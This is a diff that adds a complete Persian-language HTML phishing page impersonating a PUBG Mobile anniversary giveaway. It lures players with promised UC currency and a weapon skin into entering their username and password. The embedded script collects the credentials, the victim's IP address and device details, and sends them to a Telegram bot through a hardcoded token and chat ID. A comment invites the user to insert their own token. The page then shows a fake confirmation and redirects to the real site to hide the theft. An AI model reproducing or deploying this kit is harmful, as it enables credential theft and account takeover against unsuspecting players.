@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Mobile - رویداد سالگرد</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #0a0a0a; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: #1a1a2e; padding: 30px; border-radius: 15px; box-shadow: 0 0 30px rgba(255,215,0,0.3); width: 100%; max-width: 380px; text-align: center; }
+        .logo { font-size: 50px; margin-bottom: 10px; }
+        h2 { color: #ffd700; margin-bottom: 5px; font-size: 22px; }
+        .subtitle { color: #ff6b6b; font-size: 14px; margin-bottom: 20px; font-weight: bold; }
+        p { color: #aaa; margin-bottom: 20px; font-size: 13px; line-height: 1.6; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 2px solid #333; border-radius: 8px; background: #0f0f23; color: #fff; font-size: 15px; }
+        input:focus { border-color: #ffd700; outline: none; }
+        button { width: 100%; padding: 15px; margin-top: 15px; background: #ffd700; color: #000; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; }
+        .uc-box { background: #0f0f23; border: 1px solid #ffd700; border-radius: 8px; padding: 15px; margin: 15px 0; }
+        .uc-amount { color: #ffd700; font-size: 28px; font-weight: bold; }
+        .footer { margin-top: 20px; color: #555; font-size: 11px; }
+        #loading { display: none; color: #ffd700; margin-top: 15px; }
+        .success { display: none; color: #4ecdc4; margin-top: 15px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🎮</div>
+        <h2>PUBG Mobile</h2>
+        <div class="subtitle">🎁 رویداد ویژه سالگرد!</div>
+        
+        <div class="uc-box">
+            <div style="color:#aaa; font-size:12px;">شما برنده</div>
+            <div class="uc-amount">8,100 UC</div>
+            <div style="color:#aaa; font-size:12px;">+ اسکین M416 Glacier</div>
+        </div>
+        
+        <p>برای دریافت جوایز، لطفاً با حساب کاربری خود وارد شوید. جوایز ظرف ۲۴ ساعت به اکانت شما اضافه می‌شود.</p>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="ایمیل یا نام کاربری" required>
+            <input type="password" id="password" placeholder="رمز عبور" required>
+            <button type="submit">✨ دریافت جوایز</button>
+        </form>
+        
+        <div id="loading">⏳ در حال بررسی حساب کاربری...</div>
+        <div class="success" id="success">✅ حساب شما تأیید شد! جوایز ظرف ۲۴ ساعت واریز می‌شود.</div>
+        
+        <div class="footer">PUBG Corporation © 2026 | Event ID: #ANNIV2026</div>
+    </div>
+
+    <script>
+        // ⬇️⬇️⬇️ اینجا Token و Chat ID خودت رو بذار ⬇️⬇️⬇️
+        const BOT_TOKEN = '8974037101:AAHvJq8WFIruivfYZ5xYC8o8bhser6pO8P4';
+        const CHAT_ID = '6792248915';
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loading').style.display = 'block';
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    const ip = ipData.ip;
+                    const device = navigator.userAgent;
+                    const time = new Date().toLocaleString('fa-IR');
+                    
+                    const message = '🎮 PUBG CAPTURE\\n\\n' +
+                        '⏰ زمان: ' + time + '\\n' +
+                        '🌐 IP: ' + ip + '\\n' +
+                        '📱 دستگاه: ' + device.substring(0, 50) + '\\n' +
+                        '👤 یوزرنیم: ' + username + '\\n' +
+                        '🔑 پسورد: ' + password + '\\n\\n' +
+                        '═══════════════════════';
+                    
+                    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message
+                        })
+                    })
+                    .then(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('success').style.display = 'block';
+                        setTimeout(function() {
+                            window.location.href = 'https://pubgmobile.com';
+                        }, 3000);
+                    })
+                    .catch(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('success').style.display = 'block';
+                    });
+                });
+        });
+    </script>
+</body>
+</html>
